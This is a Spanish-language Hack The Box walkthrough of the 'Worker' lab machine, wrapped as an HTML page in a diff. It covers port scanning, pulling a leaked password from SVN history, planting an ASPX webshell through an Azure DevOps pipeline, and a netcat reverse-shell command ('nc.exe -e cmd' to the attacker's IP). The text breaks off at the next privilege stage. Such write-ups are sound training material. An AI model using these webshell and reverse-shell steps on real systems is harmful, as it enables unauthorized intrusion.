@@ -1,0 +1,955 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HackTheBox - Worker (medium) · MiguelRega7</title>
+<meta name="description" content="- Worker is a medium box that teaches about software development environments and Azure DevOps pipeline abuse. It starts with extraction of source code from a SVN server, and then "><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">Hack The Box</span><h1>HackTheBox - Worker (medium)</h1><div class="meta"><span>◷</span><time>2024-05-17</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">- Worker is a medium box that teaches about software development environments and Azure DevOps pipeline abuse. It starts with extraction of source code from a SVN server, and then .</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#portscan">PortScan</a><a href="#enumeraci-n">Enumeración</a><a href="#shell-as-defaultapppool">Shell as defaultapppool</a><a href="#shell-as-robisl">Shell as robisl</a><a href="#user-flag">User flag</a><a href="#escalada-de-privilegios">Escalada de Privilegios</a><a href="#root-txt">Root.txt</a></aside><article class="article-content" id="top"><p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/13358d0b09074485f107f36625b50a5c.png">
+</p>
+
+<ul>
+<li>Worker is a medium box that teaches about software development environments and Azure DevOps pipeline abuse. It starts with extraction of source code from a SVN server, and then moves to a local Azure DevOps installation, which can be abused to gain a foothold and escalate privileges.</li>
+</ul>
+<h2 id="portscan">PortScan</h2>
+<ul>
+<li>Comenzamos escaneando los puertos abiertos por el protocolo <strong>TCP</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap sudo nmap -sCV -p80,3690,5985 10.10.10.203 -oN targeted
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 18:47 CST
+Nmap scan report for 10.10.10.203
+Host is up (0.087s latency).
+
+PORT     STATE SERVICE  VERSION
+80/tcp   open  http     Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+3690/tcp open  svnserve Subversion
+5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre></div></div>
+<h2 id="enumeraci-n">Enumeración</h2>
+<ul>
+<li>Comenzamos enumerando el puerto 80.</li>
+</ul>
+<div class="code-window" data-language="Ruby"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Ruby</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-ruby">➜  nmap whatweb http://10.10.10.203
+http://10.10.10.203 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.203], Microsoft-IIS[10.0], Title[IIS Windows Server], X-Powered-By[ASP.NET]
+</code></pre></div></div>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/1.png">
+</p>
+
+<ul>
+<li>Vamos a hacer <code>fuzzing</code> para ver si encontramos alguna ruta interesante.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap gobuster dir -u http://10.10.10.203 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 80 --no-error
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.203
+[+] Method:                  GET
+[+] Threads:                 80
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/*checkout*           (Status: 400) [Size: 3420]
+/*docroot*            (Status: 400) [Size: 3420]
+/*                    (Status: 400) [Size: 3420]
+/http%3A%2F%2Fwww     (Status: 400) [Size: 3420]
+/http%3A              (Status: 400) [Size: 3420]
+/q%26a                (Status: 400) [Size: 3420]
+/**http%3a            (Status: 400) [Size: 3420]
+/*http%3A             (Status: 400) [Size: 3420]
+/**http%3A            (Status: 400) [Size: 3420]
+/http%3A%2F%2Fyoutube (Status: 400) [Size: 3420]
+/http%3A%2F%2Fblogs   (Status: 400) [Size: 3420]
+/http%3A%2F%2Fblog    (Status: 400) [Size: 3420]
+/**http%3A%2F%2Fwww   (Status: 400) [Size: 3420]
+/s%26p                (Status: 400) [Size: 3420]
+/%3FRID%3D2671        (Status: 400) [Size: 3420]
+/devinmoore*          (Status: 400) [Size: 3420]
+/200109*              (Status: 400) [Size: 3420]
+/*dc_                 (Status: 400) [Size: 3420]
+/*sa_                 (Status: 400) [Size: 3420]
+</code></pre></div></div>
+<ul>
+<li><p>Bueno tenemos otro puerto abierto el cual es el 3690 que corre el servicio de <code>svnserve</code> <a href="https://book.hacktricks.xyz/network-services-pentesting/3690-pentesting-subversion-svn-server">https://book.hacktricks.xyz/network-services-pentesting/3690-pentesting-subversion-svn-server</a>.</p>
+</li>
+<li><p><a href="https://www.visualsvn.com/server/">https://www.visualsvn.com/server/</a>.</p>
+</li>
+<li><p>En <code>hacktricks</code> nos dicen como podemos enumerar este servicio.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap nc -vn 10.10.10.203 3690
+(UNKNOWN) [10.10.10.203] 3690 (svn) open
+( success ( 2 2 ( ) ( edit-pipeline svndiff1 accepts-svndiff2 absent-entries commit-revprops depth log-revprops atomic-revprops partial-replay inherited-props ephemeral-txnprops file-revs-reverse list ) ) )
+</code></pre></div></div>
+<ul>
+<li>Además nos mencionan uso de esta herramienta.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap svn help
+usage: svn &lt;subcommand&gt; [options] [args]
+Subversion command-line client.
+Type 'svn help &lt;subcommand&gt;' for help on a specific subcommand.
+Type 'svn --version' to see the program version and RA modules,
+     'svn --version --verbose' to see dependency versions as well,
+     'svn --version --quiet' to see just the version number.
+
+Most subcommands take file and/or directory arguments, recursing
+on the directories.  If no arguments are supplied to such a
+command, it recurses on the current directory (inclusive) by default.
+
+Available subcommands:
+   add
+   auth
+   blame (praise, annotate, ann)
+   cat
+   changelist (cl)
+   checkout (co)
+   cleanup
+   commit (ci)
+   copy (cp)
+   delete (del, remove, rm)
+   diff (di)
+   export
+   help (?, h)
+   import
+   info
+   list (ls)
+   lock
+   log
+   merge
+   mergeinfo
+   mkdir
+   move (mv, rename, ren)
+   patch
+   propdel (pdel, pd)
+   propedit (pedit, pe)
+   propget (pget, pg)
+   proplist (plist, pl)
+   propset (pset, ps)
+   relocate
+   resolve
+   resolved
+   revert
+   status (stat, st)
+   switch (sw)
+   unlock
+   update (up)
+   upgrade
+
+Subversion is a tool for version control.
+For additional information, see http://subversion.apache.org/
+</code></pre></div></div>
+<ul>
+<li>Podemos listar lo que hay.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap svn ls svn://10.10.10.203
+dimension.worker.htb/
+moved.txt
+</code></pre></div></div>
+<ul>
+<li>Tambien nos dicen que podemos descargar el repositorio.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap svn checkout svn://10.10.10.203
+A    dimension.worker.htb
+A    dimension.worker.htb/LICENSE.txt
+A    dimension.worker.htb/README.txt
+A    dimension.worker.htb/assets
+A    dimension.worker.htb/assets/css
+A    dimension.worker.htb/assets/css/fontawesome-all.min.css
+A    dimension.worker.htb/assets/css/main.css
+A    dimension.worker.htb/assets/css/noscript.css
+A    dimension.worker.htb/assets/js
+A    dimension.worker.htb/assets/js/breakpoints.min.js
+A    dimension.worker.htb/assets/js/browser.min.js
+A    dimension.worker.htb/assets/js/jquery.min.js
+A    dimension.worker.htb/assets/js/main.js
+A    dimension.worker.htb/assets/js/util.js
+A    dimension.worker.htb/assets/sass
+A    dimension.worker.htb/assets/sass/base
+A    dimension.worker.htb/assets/sass/base/_page.scss
+A    dimension.worker.htb/assets/sass/base/_reset.scss
+A    dimension.worker.htb/assets/sass/base/_typography.scss
+A    dimension.worker.htb/assets/sass/components
+A    dimension.worker.htb/assets/sass/components/_actions.scss
+A    dimension.worker.htb/assets/sass/components/_box.scss
+A    dimension.worker.htb/assets/sass/components/_button.scss
+A    dimension.worker.htb/assets/sass/components/_form.scss
+A    dimension.worker.htb/assets/sass/components/_icon.scss
+A    dimension.worker.htb/assets/sass/components/_icons.scss
+A    dimension.worker.htb/assets/sass/components/_image.scss
+A    dimension.worker.htb/assets/sass/components/_list.scss
+A    dimension.worker.htb/assets/sass/components/_table.scss
+A    dimension.worker.htb/assets/sass/layout
+A    dimension.worker.htb/assets/sass/layout/_bg.scss
+A    dimension.worker.htb/assets/sass/layout/_footer.scss
+A    dimension.worker.htb/assets/sass/layout/_header.scss
+A    dimension.worker.htb/assets/sass/layout/_main.scss
+A    dimension.worker.htb/assets/sass/layout/_wrapper.scss
+A    dimension.worker.htb/assets/sass/libs
+A    dimension.worker.htb/assets/sass/libs/_breakpoints.scss
+A    dimension.worker.htb/assets/sass/libs/_functions.scss
+A    dimension.worker.htb/assets/sass/libs/_mixins.scss
+A    dimension.worker.htb/assets/sass/libs/_vars.scss
+A    dimension.worker.htb/assets/sass/libs/_vendor.scss
+A    dimension.worker.htb/assets/sass/main.scss
+A    dimension.worker.htb/assets/sass/noscript.scss
+A    dimension.worker.htb/assets/webfonts
+A    dimension.worker.htb/assets/webfonts/fa-brands-400.eot
+A    dimension.worker.htb/assets/webfonts/fa-brands-400.svg
+A    dimension.worker.htb/assets/webfonts/fa-brands-400.ttf
+A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff
+A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff2
+A    dimension.worker.htb/assets/webfonts/fa-regular-400.eot
+A    dimension.worker.htb/assets/webfonts/fa-regular-400.svg
+A    dimension.worker.htb/assets/webfonts/fa-regular-400.ttf
+A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff
+A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff2
+A    dimension.worker.htb/assets/webfonts/fa-solid-900.eot
+A    dimension.worker.htb/assets/webfonts/fa-solid-900.svg
+A    dimension.worker.htb/assets/webfonts/fa-solid-900.ttf
+A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff
+A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff2
+A    dimension.worker.htb/images
+A    dimension.worker.htb/images/bg.jpg
+A    dimension.worker.htb/images/overlay.png
+A    dimension.worker.htb/images/pic01.jpg
+A    dimension.worker.htb/images/pic02.jpg
+A    dimension.worker.htb/images/pic03.jpg
+A    dimension.worker.htb/index.html
+A    moved.txt
+Checked out revision 5.
+</code></pre></div></div>
+<ul>
+<li>Si vemos lo que dice <code>moved.txt</code> nos dan un subdominio nos hablan sobre una versión final.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap cat moved.txt
+This repository has been migrated and will no longer be maintaned here.
+You can find the latest version at: http://devops.worker.htb
+
+// The Worker team :)
+</code></pre></div></div>
+<ul>
+<li>Vamos agregarlos al <code>/etc/hosts</code> para que en caso de que sea alguna pagina web nos pueda resolver.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap echo &quot;10.10.10.203 devops.worker.htb dimension.worker.htb&quot; | sudo tee -a /etc/hosts
+</code></pre></div></div>
+<ul>
+<li>Nos pide credenciales.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/2.png">
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/3.png">
+</p>
+
+<ul>
+<li>En el otro subdominio solo encontramos esto.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/4.png">
+</p>
+
+<ul>
+<li>Esto es todo lo que contiene.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  dimension.worker.htb tree
+.
+├── LICENSE.txt
+├── README.txt
+├── assets
+│   ├── css
+│   │   ├── fontawesome-all.min.css
+│   │   ├── main.css
+│   │   └── noscript.css
+│   ├── js
+│   │   ├── breakpoints.min.js
+│   │   ├── browser.min.js
+│   │   ├── jquery.min.js
+│   │   ├── main.js
+│   │   └── util.js
+│   ├── sass
+│   │   ├── base
+│   │   │   ├── _page.scss
+│   │   │   ├── _reset.scss
+│   │   │   └── _typography.scss
+│   │   ├── components
+│   │   │   ├── _actions.scss
+│   │   │   ├── _box.scss
+│   │   │   ├── _button.scss
+│   │   │   ├── _form.scss
+│   │   │   ├── _icon.scss
+│   │   │   ├── _icons.scss
+│   │   │   ├── _image.scss
+│   │   │   ├── _list.scss
+│   │   │   └── _table.scss
+│   │   ├── layout
+│   │   │   ├── _bg.scss
+│   │   │   ├── _footer.scss
+│   │   │   ├── _header.scss
+│   │   │   ├── _main.scss
+│   │   │   └── _wrapper.scss
+│   │   ├── libs
+│   │   │   ├── _breakpoints.scss
+│   │   │   ├── _functions.scss
+│   │   │   ├── _mixins.scss
+│   │   │   ├── _vars.scss
+│   │   │   └── _vendor.scss
+│   │   ├── main.scss
+│   │   └── noscript.scss
+│   └── webfonts
+│       ├── fa-brands-400.eot
+│       ├── fa-brands-400.svg
+│       ├── fa-brands-400.ttf
+│       ├── fa-brands-400.woff
+│       ├── fa-brands-400.woff2
+│       ├── fa-regular-400.eot
+│       ├── fa-regular-400.svg
+│       ├── fa-regular-400.ttf
+│       ├── fa-regular-400.woff
+│       ├── fa-regular-400.woff2
+│       ├── fa-solid-900.eot
+│       ├── fa-solid-900.svg
+│       ├── fa-solid-900.ttf
+│       ├── fa-solid-900.woff
+│       └── fa-solid-900.woff2
+├── images
+│   ├── bg.jpg
+│   ├── overlay.png
+│   ├── pic01.jpg
+│   ├── pic02.jpg
+│   └── pic03.jpg
+└── index.html
+
+11 directories, 55 files
+</code></pre></div></div>
+<ul>
+<li>Aquí podemos ver el <code>Commit history</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  dimension.worker.htb svn log svn://10.10.10.203
+------------------------------------------------------------------------
+r5 | nathen | 2020-06-20 08:52:00 -0500 (Sat, 20 Jun 2020) | 1 line
+
+Added note that repo has been migrated
+------------------------------------------------------------------------
+r4 | nathen | 2020-06-20 08:50:20 -0500 (Sat, 20 Jun 2020) | 1 line
+
+Moving this repo to our new devops server which will handle the deployment for us
+------------------------------------------------------------------------
+r3 | nathen | 2020-06-20 08:46:19 -0500 (Sat, 20 Jun 2020) | 1 line
+
+-
+------------------------------------------------------------------------
+r2 | nathen | 2020-06-20 08:45:16 -0500 (Sat, 20 Jun 2020) | 1 line
+
+Added deployment script
+------------------------------------------------------------------------
+r1 | nathen | 2020-06-20 08:43:43 -0500 (Sat, 20 Jun 2020) | 1 line
+
+First version
+------------------------------------------------------------------------
+</code></pre></div></div>
+<ul>
+<li>Este es interesante.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  dimension.worker.htb svn log -r 4 svn://10.10.10.203
+------------------------------------------------------------------------
+r4 | nathen | 2020-06-20 08:50:20 -0500 (Sat, 20 Jun 2020) | 1 line
+
+Moving this repo to our new devops server which will handle the deployment for us
+------------------------------------------------------------------------
+</code></pre></div></div>
+<ul>
+<li>El archivo <code>deploy.ps1</code> fue eliminado.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  dimension.worker.htb svn log -v -r 4 svn://10.10.10.203
+------------------------------------------------------------------------
+r4 | nathen | 2020-06-20 08:50:20 -0500 (Sat, 20 Jun 2020) | 1 line
+Changed paths:
+   D /deploy.ps1
+
+Moving this repo to our new devops server which will handle the deployment for us
+------------------------------------------------------------------------
+</code></pre></div></div>
+<ul>
+<li>Si revisamos cambios que se realizaron en ese archivo antes de ser eliminado vemos credenciales.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  dimension.worker.htb svn diff -r 2:3 svn://10.10.10.203/deploy.ps1
+
+Index: deploy.ps1
+===================================================================
+--- deploy.ps1	(revision 2)
++++ deploy.ps1	(revision 3)
+@@ -1,6 +1,7 @@
+ $user = &quot;nathen&quot;
+-$plain = &quot;wendel98&quot;
++# NOTE: We cant have my password here!!!
++$plain = &quot;&quot;
+ $pwd = ($plain | ConvertTo-SecureString)
+ $Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
+ $args = &quot;Copy-Site.ps1&quot;
+-Start-Process powershell.exe -Credential $Credential -ArgumentList (&quot;-file $args&quot;)
++Start-Process powershell.exe -Credential $Credential -ArgumentList (&quot;-file $args&quot;)
+\ No newline at end of file
+</code></pre></div></div>
+<ul>
+<li>Si las probamos en el sitio web vemos que son correctas.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/5.png">
+</p>
+
+<h2 id="shell-as-defaultapppool">Shell as defaultapppool</h2>
+<ul>
+<li>Vemos varios repositorios al parecer son los subdominios.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/6.png">
+</p>
+
+<ul>
+<li><p>Como tenemos acceso podemos subir un <code>.aspx</code> para ganar acceso <a href="https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx">https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx</a>.</p>
+</li>
+<li><p>Si lo intentamos subir no nos deja.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/7.png">
+</p>
+
+<ul>
+<li><p>Nos dicen que tenemos que hacer un <code>Pull Request</code>.</p>
+</li>
+<li><p>Vamos a crear una nueva rama.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/8.png">
+</p>
+
+<ul>
+<li>Si subimos el archivo vemos que ahora si se puede.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/9.png">
+</p>
+
+<ul>
+<li>Vamos a crear un <code>Pull Request</code>.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/10.png">
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/11.png">
+</p>
+
+<ul>
+<li>Ahora lo aprobamos.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/12.png">
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/13.png">
+</p>
+
+<ul>
+<li>Pero no vemos nada.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/14.png">
+</p>
+
+<ul>
+<li><p>Podemos aprovecharnos de los Pipeline <a href="https://learn.microsoft.com/es-es/azure/azure-resource-manager/templates/deployment-tutorial-pipeline">https://learn.microsoft.com/es-es/azure/azure-resource-manager/templates/deployment-tutorial-pipeline</a>.</p>
+</li>
+<li><p>Si le damos en Run vemos que podemos construir una.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/15.png">
+</p>
+
+<ul>
+<li><p>Bueno nos da un error y esto es por que al parecer la otra rama fue eliminada yo creo entonces tenemos que hacerlo rápido lo que vamos hacer es crear todo otra vez y subir el <code>cmd.aspx</code> hacer los mismos pasos pero ahora con la nueva rama.</p>
+</li>
+<li><p>Y vemos que ya se puede.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/16.png">
+</p>
+
+<ul>
+<li>Bueno ahora solo falta agregar el subdominio al <code>/etc/hosts</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content cat /etc/hosts | tail -n1
+10.10.10.203 devops.worker.htb dimension.worker.htb alpha.worker.htb
+</code></pre></div></div>
+<ul>
+<li>Y listo.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/17.png">
+</p>
+
+<ul>
+<li><p>Ahora vamos a ganar acceso.</p>
+</li>
+<li><p>Vamos a usar el <code>netcat</code>.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
+➜  content python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+</code></pre></div></div>
+<ul>
+<li>Ahora simplemente hacemos una petición con <code>curl</code> para descargamos el nc.exe y ponerlo en esa ruta del sistema.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/18.png">
+</p>
+
+<ul>
+<li>Ahora ya nos enviamos la <code>reverse shell</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\Windows\Temp\nc.exe -e cmd tuip 443
+</code></pre></div></div>
+<ul>
+<li>Nos llega la <code>shell</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content rlwrap nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.71] from (UNKNOWN) [10.10.10.203] 50333
+Microsoft Windows [Version 10.0.17763.1282]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv&gt;whoami
+whoami
+iis apppool\defaultapppool
+
+c:\windows\system32\inetsrv&gt;
+</code></pre></div></div>
+<h2 id="shell-as-robisl">Shell as robisl</h2>
+<ul>
+<li>Aquí vemos unidades logicas.</li>
+</ul>
